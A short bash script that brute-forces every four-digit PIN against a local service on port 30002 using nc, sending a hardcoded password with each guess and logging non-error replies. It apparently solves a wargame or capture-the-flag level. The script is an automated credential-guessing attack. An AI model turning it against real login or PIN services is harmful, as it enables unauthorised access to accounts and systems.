#!/bin/bash
# Bruteforce pin codes

outFile=result

test_pin() {
    outFile=result
    pin=$1
    error="Wrong! Please enter the correct pincode. Try again."

    response=$(echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $pin" | nc localhost 30002)
    # response=$error #debugging

    echo "test pin" $pin

    # response check
    if [[ "$response" != *"$error"* ]]; then 
        echo $pin >> $outFile
        echo $response >> $outFile
    fi
}

echo "start" >> $outFile

for d1 in $( seq 0 9 ); do
    for d2 in $( seq 0 9 ); do
        for d3 in $( seq 0 9 ); do
            for d4 in $( seq 0 9 ); do
                test_pin $d1$d2$d3$d4 &
                sleep 0.03 # Prevent overloading resources
            done
        done
    done
    echo "checked "$d1"000 pins" >> $outFile
done

echo "job done" >> $outFile
